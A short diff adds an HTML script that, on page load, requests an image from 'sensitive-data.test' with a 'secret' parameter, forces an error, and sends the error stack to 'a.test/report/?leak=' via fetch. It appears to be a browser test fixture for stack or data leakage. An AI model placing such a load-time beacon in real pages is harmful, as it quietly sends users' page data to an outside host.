@@ -1,0 +1,14 @@
+<script>
+  window.addEventListener('load', function() {
+    var img = new Image();
+    img.src = 'https://sensitive-data.test/image?param=secret';
+
+    try {
+      someUndefinedFunction();
+    } catch (e) {
+      fetch('https://a.test/report/?leak=' + encodeURIComponent(e.stack));
+    }
+
+    document.head.appendChild(img);
+  });
+</script>
